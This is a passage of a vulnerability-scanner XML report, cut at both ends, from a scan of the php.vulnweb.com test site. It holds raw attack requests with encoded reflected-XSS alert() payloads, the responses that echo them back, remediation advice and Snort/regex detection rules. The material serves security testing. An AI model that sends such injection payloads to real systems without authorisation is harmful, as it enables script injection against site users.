<div id="masthead"> 
  <h1 id="siteName">ACUNETIX ART</h1> 
</div>
<div id="content">
	<p>You have been introduced to our database with the above informations:</p><ul><li>Username: 12345</li><li>Password: foo</li><li>Name: 12345<sCrIpT>alert(54482)</sCrIpT></li><li>Address: 1707 Interdimensional Street</li><li>E-Mail: John.Doe@somewhere.com</li><li>Phone number: 770</li><li>Credit card: 12345</li></ul><p>Now you can login from <a href='http://php.vulnweb.com/login.php'>here.</p></div>
</body>
</html>
]]></RawResponse><Request id="354D91E959028B76C289FEAF7E6F4249"><Method>POST</Method><Path>/secured/</Path><File>newuser</File><Ext>php</Ext><PageMark /><HTTPVersion>HTTP/1.1</HTTPVersion><FullQuery /><FullPostData>uuname=12345&amp;upass=foo&amp;upass2=foo&amp;urname=12345%3c%73%43%72%49%70%54%3e%61%6c%65%72%74%28%35%34%34%38%32%29%3c%2f%73%43%72%49%70%54%3e&amp;ucc=12345&amp;uemail=John.Doe%40somewhere.com&amp;uphone=770&amp;uaddress=1707%20Interdimensional%20Street&amp;signup=signup</FullPostData><XMLPostData /><MultiPartPostData /><RawASCIIPostData /><Cookie>Cookie: CustomCookie=WebInspect0
</Cookie><Queries /><Headers><Header><Name>Referer</Name><Value>http://php.vulnweb.com/signup.php</Value></Header><Header><Name>Content-Type</Name><Value>application/x-www-form-urlencoded</Value></Header><Header><Name>Content-Length</Name><Value>242</Value></Header><Header><Name>Accept</Name><Value>*/*</Value></Header><Header><Name>Pragma</Name><Value>no-cache</Value></Header><Header><Name>Accept-Encoding</Name><Value>gzip, deflate</Value></Header><Header><Name>User-Agent</Name><Value>Mozilla/5.0 (Windows NT 6.2; Win64; x64; rv:58.0) Gecko/20100101 Firefox/58.0</Value></Header><Header><Name>Host</Name><Value>php.vulnweb.com</Value></Header><Header><Name>Connection</Name><Value>Keep-Alive</Value></Header><Header><Name>X-WIPP</Name><Value>AscVersion=20.1.0.199</Value></Header><Header><Name>X-Scan-Memo</Name><Value>Category="Audit.Attack";SID="354D91E959028B76C289FEAF7E6F4249";PSID="FAF765E4B6181822E8C9C961F9569838";SessionType="AuditAttack";CrawlType="None";AttackType="PostParamManipulation";OriginatingEngineID="1354e211-9d7d-4cc1-80e6-4de3fd128002";AttackSequence="2";AttackParamDesc="urname";AttackParamIndex="3";AttackParamSubIndex="0";CheckId="5105";Engine="Cross+Site+Scripting";SmartMode="4";AttackString="12345%253c%2573%2543%2572%2549%2570%2554%253e%2561%256c%2565%2572%2574%2528%2535%2534%2534%2538%2532%2529%253c%252f%2573%2543%2572%2549%2570%2554%253e";AttackStringProps="Attack";tid="41";tt="40";</Value></Header><Header><Name>X-RequestManager-Memo</Name><Value>sid="31";smi="0";sc="1";ID="b2625338";</Value></Header><Header><Name>X-Request-Memo</Name><Value>ID="917ce9f2";sc="1";tid="41";</Value></Header></Headers><Cookies><Cookie><Name>CustomCookie</Name><Value>WebInspect0</Value><Domain /><Path /></Cookie></Cookies></Request><Response><HTTPVersion>HTTP/1.1</HTTPVersion><StatusCode>200</StatusCode><StatusDescription>OK</StatusDescription><SetCookie /><ResponseBody><![CDATA[<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01 Transitional//EN" "http://www.w3.org/TR/html4/loose.dtd">
<html>
<head>
<title>add new user</title>
<meta http-equiv="Content-Type" content="text/html; charset=iso-8859-1">
<link href="style.css" rel="stylesheet" type="text/css">
</head>
<body>
<div id="masthead"> 
  <h1 id="siteName">ACUNETIX ART</h1> 
</div>
<div id="content">
	<p>You have been introduced to our database with the above informations:</p><ul><li>Username: 12345</li><li>Password: foo</li><li>Name: 12345<sCrIpT>alert(54482)</sCrIpT></li><li>Address: 1707 Interdimensional Street</li><li>E-Mail: John.Doe@somewhere.com</li><li>Phone number: 770</li><li>Credit card: 12345</li></ul><p>Now you can login from <a href='http://php.vulnweb.com/login.php'>here.</p></div>
</body>
</html>
]]></ResponseBody><Headers><Header><Name>Via</Name><Value>1.1 189.9.60.27 (McAfee Web Gateway 7.8.2.16.0.31231)</Value></Header><Header><Name>Date</Name><Value>Fri, 11 Dec 2020 21:52:51 GMT</Value></Header><Header><Name>Server</Name><Value>nginx/1.19.0</Value></Header><Header><Name>Connection</Name><Value>keep-alive</Value></Header><Header><Name>Content-Type</Name><Value>text/html; charset=UTF-8</Value></Header><Header><Name>X-Powered-By</Name><Value>PHP/5.6.40-38+ubuntu20.04.1+deb.sury.org+1</Value></Header><Header><Name>Content-Length</Name><Value>811</Value></Header></Headers><SetCookies /><Forms /></Response></Session><Session requestId="ED4C241D43FD18BFC0C31FF9235AB3B5"><URL>http://php.vulnweb.com:80/hpp/params.php?p=valid&amp;pp=12%3c%73%43%72%49%70%54%3e%61%6c%65%72%74%28%34%37%33%32%37%29%3c%2f%73%43%72%49%70%54%3e&amp;aaaa=Submit</URL><Scheme>http</Scheme><Host>php.vulnweb.com</Host><Port>80</Port><AttackParamDescriptor>pp</AttackParamDescriptor><Issues><Issue id="54119778-6aa4-4c5a-b590-f12f81ee0ee9"><CheckTypeID>Vulnerability</CheckTypeID><EngineType>5105</EngineType><AttackHTTPRequest><![CDATA[GET /hpp/params.php?p=valid&pp=12%3c%73%43%72%49%70%54%3e%61%6c%65%72%74%28%34%37%33%32%37%29%3c%2f%73%43%72%49%70%54%3e&aaaa=Submit HTTP/1.1
Referer: http://php.vulnweb.com/hpp/?pp=12
Accept: */*
Pragma: no-cache
Accept-Encoding: gzip, deflate
User-Agent: Mozilla/5.0 (Windows NT 6.2; Win64; x64; rv:58.0) Gecko/20100101 Firefox/58.0
Host: php.vulnweb.com
Connection: Keep-Alive
X-WIPP: AscVersion=20.1.0.199
X-Scan-Memo: Category="Audit.Attack";SID="ED4C241D43FD18BFC0C31FF9235AB3B5";PSID="793A823C2E6F80ADC40DEDD5432FE66A";SessionType="AuditAttack";CrawlType="None";AttackType="QueryParamManipulation";OriginatingEngineID="1354e211-9d7d-4cc1-80e6-4de3fd128002";AttackSequence="2";AttackParamDesc="pp";AttackParamIndex="1";AttackParamSubIndex="0";CheckId="5105";Engine="Cross+Site+Scripting";SmartMode="4";AttackString="12%253c%2573%2543%2572%2549%2570%2554%253e%2561%256c%2565%2572%2574%2528%2534%2537%2533%2532%2537%2529%253c%252f%2573%2543%2572%2549%2570%2554%253e";AttackStringProps="Attack";tid="42";tt="40";
X-RequestManager-Memo: sid="33";smi="0";sc="1";ID="974a0283";
X-Request-Memo: ID="ae05efbd";sc="1";tid="42";
Cookie: CustomCookie=WebInspect0

]]></AttackHTTPRequest><VulnerabilityID>5649</VulnerabilityID><Severity>4</Severity><Name>Cross-Site Scripting</Name><Classifications><Classification kind="CWE" identifier="CWE-80" href="http://cwe.mitre.org/data/definitions/80.html">CWE-80: Improper Neutralization of Script-Related HTML Tags in a Web Page (Basic XSS)</Classification><Classification kind="7PK" identifier="Input Validation and Representation" href="https://vulncat.fortify.com/">Input Validation and Representation</Classification><Classification kind="7PK Category" identifier="Cross-Site Scripting: Reflected" href="https://vulncat.fortify.com/">Cross-Site Scripting: Reflected</Classification></Classifications><DetectionSelection><Location offset="287" length="29" /></DetectionSelection><ReportSection><Name>Summary</Name><SectionText><![CDATA[<drc_fortify /><hp-img src="xss.rgc" /><br /><drc_xssrf />A Cross-Site Scripting (XSS) vulnerability was detected in the web application. Cross-Site Scripting occurs when dynamically generated web pages display user input, such as login information, that is not properly validated, allowing an attacker to embed malicious scripts into the generated page and then execute the script on the machine of any user that views the site. In this instance, the web application was vulnerable to an automatic payload, meaning the user simply has to visit a page to make the malicious scripts execute. If successful, Cross-Site Scripting vulnerabilities can be exploited to manipulate or steal cookies, create requests that can be mistaken for those of a valid user, compromise confidential information, or execute malicious code on end user systems. Recommendations include implementing secure programming techniques that ensure proper filtration of user-supplied data, and encoding all user supplied data to prevent inserted scripts being sent to end users in a format that can be executed.]]></SectionText></ReportSection><ReportSection><Name>Implication</Name><SectionText><![CDATA[<br />
Cross-Site Scripting(XSS) happens when user input from a web client is immediately included via server-side scripts in a dynamically generated web page. Reflected XSS is specifically considered critical when malicious payload can be embedded in a URL (e.g. in query strings of GET requests). An attacker can trick a victim, via phishing attack, to click on a link with vulnerable input which has been altered to include attack code and then sent to the legitimate server. The injected code is then reflected back to the user's browser which executes it. <br /><br />

The implications of successful Cross-Site Scripting attacks are:

<ul><li>Account hijacking -  An attacker can hijack the user's session before the session cookie expires and take actions with the privileges of the user who accessed the URL, such as issuing database queries and viewing the results. </li><li>Malicious script execution - Users can unknowingly execute JavaScript, VBScript, ActiveX, HTML, or even Flash content that has been inserted into a dynamically generated page by an attacker. 

</li><li>Worm propagation - With Ajax applications, XSS can propagate somewhat like a virus. The XSS payload can autonomously inject itself into pages, and easily re-inject the same host with more XSS, all of which can be done with no hard refresh. Thus, XSS can send multiple requests using complex HTTP methods to propagate itself invisibly to the user.
</li><li>Information theft - Via redirection and fake sites, attackers can connect users to a malicious server of the attacker's choice and capture any information entered by the user.</li><li>	Denial of Service - Often by utilizing malformed display requests on sites that contain a Cross-Site Scripting vulnerability, attackers can cause a denial of service condition to occur by causing the host site to query itself repeatedly . </li><li>Browser Redirection - On certain types of sites that use frames, a user can be made to think that he is in fact on the original site when he has been redirected to a malicious one, since the URL in the browser's address bar will remains the same. This is because the entire page isn't being redirected, just the frame in which the JavaScript is being executed is redirected. </li><li>	Manipulation of user settings - Attackers can change user settings for nefarious purposes. </li><li>Bypass Content-Security-Policy protection  -  Attackers can inject a malformed tag formation, known as dangling tag injection, which in some cases allows injected script to reuse valid nonce on the page and bypass script source restriction. Additionally dangling tag injection can be used to steal sensitive information embedded in HTML response if browser is able to make a request to the injected link. </li><li>Base tag injection: Attacker can cause relative links on a page to load from a different domain by modifying the base URL for the page via base tag injection.</li><li>Link prefetch injection: While unable to execute script, attackers can use link tag with rel=prefetch that will make browsers pre-fetch the specified link even though it is never rendered and rejected subsequently due to web application enforced cross-site policy (e.g. CSP protections).</li><li>Edge side includes (ESI) Injection - ESI  is a markup language used in various HTTP devices, such as reverse proxies and load balancers, that are positioned between client and server.  An attacker can inject ESI markup to perform critical attacks such as cross-site scripting and HTTPOnly cookie protection bypass. </li></ul>]]></SectionText></ReportSection><ReportSection><Name>Execution</Name><SectionText><![CDATA[<br />

View the attack string included with the request to check what to search for in the response. For instance, if "(javascript:alert('XSS')"  is submitted as an attack (or another scripting language), it will also appear as part of the response.  This indicates that the web application is taking values from the HTTP request parameters and using them in the HTTP response without first removing potentially malicious data.


The response can be viewed in “Web Browser” view in the Vulnerability pane to see the injected popup events in action. Events requiring user interaction (e.g. onmouseover or onclick events) can be triggered by performing the corresponding action (e.g. clicking the injected link). 



Injection with numeric string in src, or href, attributes indicates that the site is vulnerable to script include or content exfiltration. These can be verified by repeating the request in a browser and intercepting originating network traffic in a web proxy.]]></SectionText></ReportSection><ReportSection><Name>Fix</Name><SectionText><![CDATA[<br /><b>For Development:</b><br /><br />
Cross-Site Scripting attacks can be avoided by carefully validating all input, and properly encoding all output. When validating user input, 

verify that it matches the strictest definition of valid input possible. For example, if a certain parameter is supposed to be a number, attempt 

to convert it to a numeric data type in your programming language. <br /><br /><b>PHP:</b> intval("0".$_GET['q']);   <br /><br /><b>ASP.NET:</b> 

int.TryParse(Request.QueryString["q"], out val); <br /><br />

The same applies to date and time values, or anything that can be converted to a stricter type before being used. When accepting other types of 

text input, make sure the value matches either a list of acceptable values (white-listing), or a strict regular expression. If at any point the 

value appears invalid, do not accept it. Also, do not attempt to return the value to the user in an error message. <br /><br />

Most server side scripting languages provide built in methods to convert the value of the input variable into correct, non-interpretable HTML. 

These should be used to sanitize all input before it is displayed to the client. <br /><br /><b>PHP:</b>  string htmlspecialchars (string string 

[, int quote_style])<br /><br /><b>ASP.NET:</b> Server.HTMLEncode (strHTML String)



<br /><br />

When reflecting values into JavaScript or another format, make sure to use a type of encoding that is appropriate. Encoding data for HTML is not 

sufficient when it is reflected inside of a script or style sheet. For example, when reflecting data in a JavaScript string, make sure to encode 

all non-alphanumeric characters using hex (\xHH) encoding.<br /><br />

If you have JavaScript on your page that accesses unsafe information (like location.href) and writes it to the page (either with document.write, 

or by modifying a DOM element), make sure you encode data for HTML before writing it to the page. JavaScript does not have a built-in function to 

do this, but many frameworks do. If you are lacking an available function, something like the following will handle most cases:<br /><br />

s = s.replace(/&amp;/g,'&amp;amp;').replace(/"/i,'&amp;quot;').replace(/&lt;/i,'&amp;lt;').replace(/&gt;/i,'&amp;gt;').replace(/'/i,'&amp;apos;')


<br /><br />

Ensure that you are always using the right approach at the right time. Validating user input should be done as soon as it is received. Encoding 

data for display should be done immediately before displaying it.

<b><br /><br />


For Security Operations:</b><br /><br />

Server-side encoding, where all dynamic content is first sent through an encoding function where Scripting tags will be replaced with codes in the 

selected character set, can help to prevent Cross-Site Scripting attacks. <br /><br />

Many web application platforms and frameworks have some built-in support for preventing Cross-Site Scripting. Make sure that any built-in 

protection is enabled for your platform. In some cases, a misconfiguration could allow Cross-Site Scripting. In ASP.NET, if a page's 

EnableViewStateMac property is set to False, the ASP.NET view state can be used as a vector for Cross-Site Scripting. <br /><br />

An IDS or IPS can also be used to detect or filter out XSS attacks. Below are a few regular expressions that will help detect Cross-Site 

Scripting. <br /><br /><b>Regex for a simple XSS attack:</b><br />
/((\%3C)|&lt;)((\%2F)|\/)*[a-z0-9\%]+((\%3E)|&gt;)/ix <br /><br />

The above regular expression would be added into a new Snort rule as follows: <br /><br />

alert tcp $EXTERNAL_NET any -&gt; $HTTP_SERVERS $HTTP_PORTS (msg:"NII Cross-Site Scripting attempt"; flow:to_server,established; 

pcre:"/((\%3C)|&lt;)((\%2F)|\/)*[a-z0-9\%]+((\%3E)|&gt;)/i"; classtype:Web-application-attack; sid:9000; rev:5;) <br /><br /><b>Paranoid regex for 

XSS attacks:</b><br />
/((\%3C)|&lt;)[^\n]+((\%3E)|&gt;)/I <br /><br />

This signature simply looks for the opening HTML tag, and its hex equivalent, followed by one or more characters other than the new line, and then 

followed by the closing tag or its hex equivalent. This may end up giving a few false positives depending upon how your web application and web 

server are structured, but it is guaranteed to catch anything that even remotely resembles a Cross-Site Scripting attack.

<br /><br /><b>For QA:</b><br /><br />


Fixes for Cross-Site Scripting defects will ultimately require code based fixes. Read the the following links for more information 

about manually testing your application for Cross-Site Scripting.]]></SectionText></ReportSection><ReportSection><Name>Reference Info</Name><SectionText><![CDATA[<br /><br /><b>OWASP Cross-Site Scripting Information</b><br /><a href="https://www.owasp.org/index.php/XSS">https://www.owasp.org/index.php/XSS</a><br /><br /><b>CERT</b><br /><a href="http://www.cert.org/advisories/CA-2000-02.html">http://www.cert.org/advisories/CA-2000-02.html</a><br /><br /><b>Apache</b><br /><a href="http://httpd.apache.org/info/css-security/apache_specific.html">http://httpd.apache.org/info/css-security/apache_specific.html</a><br /><br /><b>SecurityFocus.com</b><br /><a href="http://www.securityfocus.com/infocus/1768 ">http://www.securityfocus.com/infocus/1768 </a>]]></SectionText></ReportSection><ReportSection><Name>Description</Name><SectionText><![CDATA[Cross-Site Scripting occurs when dynamically generated web pages display input, such as login information, that is not properly validated, allowing an attacker to embed malicious scripts into the generated page and then execute the script on the machine of any user that views the site. If successful, Cross-Site Scripting vulnerabilities can be exploited to manipulate or steal cookies, create requests that can be mistaken for those of a valid user, compromise confidential information, or execute malicious code on the end user systems for a variety of nefarious purposes. Recommendations include implementing secure programming techniques that ensure proper filtration of user-supplied data, utilizing client-side validation of user supplied data, and encoding all user supplied data to prevent inserted scripts being sent to end users in a format that can be executed.]]></SectionText></ReportSection><ReportSection><Name>Impact Score</Name><SectionText><![CDATA[High]]></SectionText></ReportSection><ReportSection><Name>Impact Description</Name><SectionText><![CDATA[When successfully exploited, Cross-Site Scripting gives an attacker a method of taking control of the interaction between a user and a web site. On a simple site composed of static content, this might only lead to changing how pages display to a specific user. When the site is capable of accepting user input, such as login information, or allows users to make choices with real world implications such as transferring funds or accessing private data, Cross-Site Scripting presents its most serious threat. The most significant danger from a successful Cross-Site Scripting attack is that an attacker will be able to emulate the credentials of an actual user by gaining access to a user’s session cookie, thereby hijacking the user session and taking over the account. The FDIC has recently indicated that unauthorized access to checking accounts is the fastest growing form of identity theft. More often than not, these instances of account hijacking are due to the presence of Cross-site scripting vulnerabilities. When an attacker gains control on the user’s end, it then often becomes unnecessary to break into the server. By that point, he already has the means to acquire the information he needs.]]></SectionText></ReportSection><ReportSection><Name>Probability Score</Name><SectionText><![CDATA[Critical]]></SectionText></ReportSection><ReportSection><Name>Probability Description</Name><SectionText><![CDATA[To carry out a Cross-Site Scripting attack, an attacker will create a URL that takes advantage of a Cross-Site Scripting flaw. The attacker must then find some way of getting a victim to visit this URL. This can be done in many ways, ranging from getting it listed in a search engine to exploiting weaknesses in mail clients that allow scripted content to be executed. Once the victim has used the Cross-Site Scripting URL, the attacker's malicious code will be executed on his or her system.  In other words, there is a lot of effort required up-front for these attacks to be successful.  However, the potential payoff makes that effort worthwhile more often than not.]]></SectionText></ReportSection><ReportSection><Name>Risk Score</Name><SectionText><![CDATA[High]]></SectionText></ReportSection><ReportSection><Name>Risk Description</Name><SectionText><![CDATA[This vulnerability should be addressed quickly, especially if the application is already in production.]]></SectionText></ReportSection><ReportSection><Name>Fix Description</Name><SectionText><![CDATA[Cross-Site Scripting attacks can be avoided by carefully validating all input, and properly encoding all output. Validation can be done using standard ASP.NET Validation controls, or directly in your code. Do not attempt to sanitize input by removing script strings or characters, simply reject it. Always use as strict a pattern as you can possibly allow.<br /><br />
Encoding of output insures that any scriptable content is properly encoded for HTML before being sent to the client. This is done with the function HttpUtility.HtmlEncode, as shown in the following Label control sample:<br /><br />
	Label2.Text = HttpUtility.HtmlEncode(input)
<br /><br />Be sure to consider all paths that user input takes through your application. For instance, if data is entered by the user, stored in a database, and then redisplayed later, you must make sure it is properly encoded each time it is retrieved.If you must allow free-format text input, such as in a message board, and you wish to allow some HTML formatting to be used, you can handle this safely by explicitly allowing only a small list of safe tags. Here is an example of how to do this safely:<br /><br />
C# Example:<br /><br />
            StringBuilder sb = new StringBuilder(<br />
                HttpUtility.HtmlEncode(input)); <br />
            sb.Replace("&amp;lt;b&amp;gt;", "&lt;b&gt;"); <br />
            sb.Replace("&amp;lt;/b&amp;gt;", "&lt;b&gt;"); <br />
            sb.Replace("&amp;lt;i&amp;gt;", "&lt;i&gt;"); <br />
            sb.Replace("&amp;lt;/i&amp;gt;", "&lt;/i&gt;"); <br />
            Response.Write(sb.ToString());<br /><br />

VB.NET Example: <br /><br />
        Dim sb As StringBuilder = New StringBuilder( _ <br />
                HttpUtility.HtmlEncode(input)) <br />
        sb.Replace("&amp;lt;b&amp;gt;", "&lt;b&gt;") <br />
        sb.Replace("&amp;lt;/b&amp;gt;", "&lt;b&gt;") <br />
        sb.Replace("&amp;lt;i&amp;gt;", "&lt;i&gt;") <br />
        sb.Replace("&amp;lt;/i&amp;gt;", "&lt;/i&gt;") <br />
        Response.Write(sb.ToString())<br /><br />

The following recommendations will help you build web applications capable of withstanding Cross-Site Scripting attacks. 
<ul><li>Define what is allowed. Ensure that the web application validates all input parameters (cookies, headers, query strings, forms, hidden fields, etc.) against a stringent definition of expected results. </li><li>Check the responses from POST and GET requests to ensure what is being returned is what is expected, and is valid. </li><li>Use client-side validation when adding extra functionality to user input checking in addition to other forms of data checking. </li><li>Remove conflicting characters, brackets, and single and double quotes from user input by encoding user supplied data. This will prevent inserted scripts from being sent to end users in a form that can be executed. </li><li>Whenever possible, limit all client-supplied data to alphanumeric data. Using this filtering scheme, if a user entered " &lt;script&gt;alertdocumentcookie( 'aaa') &lt;/script&gt;", it would be reduced to "scriptalertdocumentcookiescript". If non-alphanumeric characters must be used, encode them as HTML entities before using them in an HTTP response, so that they cannot be used to modify the structure of the HTML document. </li><li>Use two-factor customer authentication mechanisms as opposed to single-factor authentication. </li><li>Verify the origin of scripts before you modify or utilize them. </li><li>Do not implicitly trust any script given to you by others (whether downloaded from the web, or given to you by an acquaintance) for use in your own code. </li></ul>
Most server side scripting languages provide built in methods to convert the value of the input variable into correct, non-interpretable HTML. These should be used to sanitize all input before displayed to the client. 
<br /><br />
ASP / ASP.NET: Server.HTMLEncode (strHTML String)<br /><br />]]></SectionText></ReportSection><ReportSection><Name>References</Name><SectionText /></ReportSection><ReportSection><Name>Fix Description</Name><SectionText><![CDATA[<br />The following recommendations will help you build web applications capable of withstanding Cross-Site Scripting attacks. 
<ul><li>Define what is allowed. Ensure that the Web application validates all input parameters (cookies, headers, query strings, forms, hidden fields, etc.) against a stringent definition of expected results. </li><li>Check the responses from POST and GET requests to ensure the data being returned is what is expected, and is valid. </li><li>When adding extra functionality to user-input checking, use client-side validation in addition to other forms of data checking. </li><li>Remove conflicting characters, brackets, and single and double quotes from user input by encoding user-supplied data. This will prevent inserted scripts from being sent to end users in a form that can be executed. </li><li>Whenever possible, limit all client-supplied data to alphanumeric data. Using this filtering scheme, if a user entered "&lt;script&gt;alertdocumentcookie('aaa')&lt;/script&gt;", it would be reduced to "scriptalertdocumentcookiescript". If non-alphanumeric characters must be used, encode them as HTML entities before using them in an HTTP response. Encoding ensures that the characters cannot be used to modify the structure of the HTML document. </li><li>Use two-factor customer authentication mechanisms, such as requiring a token and password, as opposed to single-factor authentication, such as requiring only a password. </li><li>Verify the origin of scripts before you modify or utilize them. </li><li>Do not implicitly trust any script given to you by others (whether downloaded from the Web or given to you by an acquaintance) for use in your own code. </li></ul>
The Java language does not have a built-in method to convert the value of the input variable into correct, non-interpretable HTML. The following code samples show two different ways of writing a utility method to sanitize all user input before displaying it back to the client. <br /><br /><br />
public static String HTMLEncode(String aTagFragment){ <br /><br />
  //make sure you replace &amp; first<br />
  aTagFragment = aTagFragment.replaceAll("&amp;", "&amp;amp;"); <br />
  aTagFragment = aTagFragment.replaceAll("&lt;", "&amp;lt;"); <br />
  aTagFragment = aTagFragment.replaceAll("&gt;", "&amp;gt;"); <br />
  aTagFragment = aTagFragment.replaceAll("\"", "&amp;quot;"); <br />
  aTagFragment = aTagFragment.replaceAll("'", "&amp;#39;"); <br />
  //replace backslash ‘\’ character<br />
  aTagFragment = aTagFragment.replaceAll("\\\\", "&amp;#92;"); <br /><br />
  return aTagFragment; <br />
}<br /><br />
public static String HTMLEncode(String aTagFragment){ <br />
  final StringBuffer result = new StringBuffer();<br />
  final StringCharacterIterator iterator = new StringCharacterIterator(aTagFragment); <br />
  char character = iterator.current();<br />
  while (character != StringCharacterIterator.DONE ){ <br />
   		if (character == '&lt;') { <br />
   			result.append("&amp;lt;"); <br />
   		} <br />
   		else if (character == '&gt;') { <br />
   			result.append("&amp;gt;"); <br />
   		} <br />
   		else if (character == '\"') { <br />
   			result.append("&amp;quot;"); <br />
   		} <br />
   		else if (character == '\'") { <br />
   			result.append("&amp;#39;"); <br />
   		} <br />
   		else if (character == '\\') { <br />
   			result.append("&amp;#92;"); <br />
   		} <br />
   		else if (character == '&amp;') { <br />
   			result.append("&amp;amp;"); <br />
   		} <br />
   		else { <br />
   			//the char is not a special one <br />
   			//add it to the result as is <br />
   			result.append(character); <br />
   		} <br />
   		character = iterator.next();<br />
   	} <br />
   	return result.toString();<br />
}]]></SectionText></ReportSection><ReportSection><Name>References</Name><SectionText /></ReportSection></Issue></Issues><RawRequest id="ED4C241D43FD18BFC0C31FF9235AB3B5"><![CDATA[GET /hpp/params.php?p=valid&pp=12%3c%73%43%72%49%70%54%3e%61%6c%65%72%74%28%34%37%33%32%37%29%3c%2f%73%43%72%49%70%54%3e&aaaa=Submit HTTP/1.1
Referer: http://php.vulnweb.com/hpp/?pp=12
Accept: */*
Pragma: no-cache
Accept-Encoding: gzip, deflate
User-Agent: Mozilla/5.0 (Windows NT 6.2; Win64; x64; rv:58.0) Gecko/20100101 Firefox/58.0
Host: php.vulnweb.com
Connection: Keep-Alive
X-WIPP: AscVersion=20.1.0.199
X-Scan-Memo: Category="Audit.Attack";SID="ED4C241D43FD18BFC0C31FF9235AB3B5";PSID="793A823C2E6F80ADC40DEDD5432FE66A";SessionType="AuditAttack";CrawlType="None";AttackType="QueryParamManipulation";OriginatingEngineID="1354e211-9d7d-4cc1-80e6-4de3fd128002";AttackSequence="2";AttackParamDesc="pp";AttackParamIndex="1";AttackParamSubIndex="0";CheckId="5105";Engine="Cross+Site+Scripting";SmartMode="4";AttackString="12%253c%2573%2543%2572%2549%2570%2554%253e%2561%256c%2565%2572%2574%2528%2534%2537%2533%2532%2537%2529%253c%252f%2573%2543%2572%2549%2570%2554%253e";AttackStringProps="Attack";tid="42";tt="40";
X-RequestManager-Memo: sid="33";smi="0";sc="1";ID="974a0283";
X-Request-Memo: ID="ae05efbd";sc="1";tid="42";
Cookie: CustomCookie=WebInspect0

]]></RawRequest><RawResponse><![CDATA[HTTP/1.1 200 OK
Via: 1.1 189.9.60.27 (McAfee Web Gateway 7.8.2.16.0.31231)
Date: Fri, 11 Dec 2020 21:52:54 GMT
Server: nginx/1.19.0
Connection: keep-alive
Content-Type: text/html; charset=UTF-8
X-Powered-By: PHP/5.6.40-38+ubuntu20.04.1+deb.sury.org+1
Content-Length: 36

valid12<sCrIpT>alert(47327)</sCrIpT>]]></RawResponse><Request id="ED4C241D43FD18BFC0C31FF9235AB3B5"><Method>GET</Method><Path>/hpp/</Path><File>params</File><Ext>php</Ext><PageMark /><HTTPVersion>HTTP/1.1</HTTPVersion><FullQuery>p=valid&amp;pp=12%3c%73%43%72%49%70%54%3e%61%6c%65%72%74%28%34%37%33%32%37%29%3c%2f%73%43%72%49%70%54%3e&amp;aaaa=Submit</FullQuery><FullPostData /><XMLPostData /><MultiPartPostData /><RawASCIIPostData><![CDATA[]]></RawASCIIPostData><Cookie>Cookie: CustomCookie=WebInspect0
</Cookie><Queries><Query><Name>p</Name><Value>valid</Value></Query><Query><Name>pp</Name><Value>12%3c%73%43%72%49%70%54%3e%61%6c%65%72%74%28%34%37%33%32%37%29%3c%2f%73%43%72%49%70%54%3e</Value></Query><Query><Name>aaaa</Name><Value>Submit</Value></Query></Queries><Headers><Header><Name>Referer</Name><Value>http://php.vulnweb.com/hpp/?pp=12</Value></Header><Header><Name>Accept</Name><Value>*/*</Value></Header><Header><Name>Pragma</Name><Value>no-cache</Value></Header><Header><Name>Accept-Encoding</Name><Value>gzip, deflate</Value></Header><Header><Name>User-Agent</Name><Value>Mozilla/5.0 (Windows NT 6.2; Win64; x64; rv:58.0) Gecko/20100101 Firefox/58.0</Value></Header><Header><Name>Host</Name><Value>php.vulnweb.com</Value></Header><Header><Name>Connection</Name><Value>Keep-Alive</Value></Header><Header><Name>X-WIPP</Name><Value>AscVersion=20.1.0.199</Value></Header><Header><Name>X-Scan-Memo</Name><Value>Category="Audit.Attack";SID="ED4C241D43FD18BFC0C31FF9235AB3B5";PSID="793A823C2E6F80ADC40DEDD5432FE66A";SessionType="AuditAttack";CrawlType="None";AttackType="QueryParamManipulation";OriginatingEngineID="1354e211-9d7d-4cc1-80e6-4de3fd128002";AttackSequence="2";AttackParamDesc="pp";AttackParamIndex="1";AttackParamSubIndex="0";CheckId="5105";Engine="Cross+Site+Scripting";SmartMode="4";AttackString="12%253c%2573%2543%2572%2549%2570%2554%253e%2561%256c%2565%2572%2574%2528%2534%2537%2533%2532%2537%2529%253c%252f%2573%2543%2572%2549%2570%2554%253e";AttackStringProps="Attack";tid="42";tt="40";</Value></Header><Header><Name>X-RequestManager-Memo</Name><Value>sid="33";smi="0";sc="1";ID="974a0283";</Value></Header><Header><Name>X-Request-Memo</Name><Value>ID="ae05efbd";sc="1";tid="42";</Value></Header></Headers><Cookies><Cookie><Name>CustomCookie</Name><Value>WebInspect0</Value><Domain /><Path /></Cookie></Cookies></Request><Response><HTTPVersion>HTTP/1.1</HTTPVersion><StatusCode>200</StatusCode><StatusDescription>OK</StatusDescription><SetCookie /><ResponseBody><![CDATA[valid12<sCrIpT>alert(47327)</sCrIpT>]]></ResponseBody><Headers><Header><Name>Via</Name><Value>1.1 189.9.60.27 (McAfee Web Gateway 7.8.2.16.0.31231)</Value></Header><Header><Name>Date</Name><Value>Fri, 11 Dec 2020 21:52:54 GMT</Value></Header><Header><Name>Server</Name><Value>nginx/1.19.0</Value></Header><Header><Name>Connection</Name><Value>keep-alive</Value></Header><Header><Name>Content-Type</Name><Value>text/html; charset=UTF-8</Value></Header><Header><Name>X-Powered-By</Name><Value>PHP/5.6.40-38+ubuntu20.04.1+deb.sury.org+1</Value></Header><Header><Name>Content-Length</Name><Value>36</Value></Header></Headers><SetCookies /><Forms /></Response></Session><Session requestId="7570325A6879014F9BFFBC41D6B89C31"><URL>http://php.vulnweb.com:80/secured/newuser.php</URL><Scheme>http</Scheme><Host>php.vulnweb.com</Host><Port>80</Port><AttackParamDescriptor>ucc</AttackParamDescriptor><Issues><Issue id="6eb8a9fd-6d5c-4f2f-b373-83a5319b3b40"><CheckTypeID>Vulnerability</CheckTypeID><EngineType>5105</EngineType><AttackHTTPRequest><![CDATA[POST /secured/newuser.php HTTP/1.1
Referer: http://php.vulnweb.com/signup.php
Content-Type: application/x-www-form-urlencoded
Content-Length: 242
Accept: */*
Pragma: no-cache
Accept-Encoding: gzip, deflate
User-Agent: Mozilla/5.0 (Windows NT 6.2; Win64; x64; rv:58.0) Gecko/20100101 Firefox/58.0
Host: php.vulnweb.com
Connection: Keep-Alive
X-WIPP: AscVersion=20.1.0.199
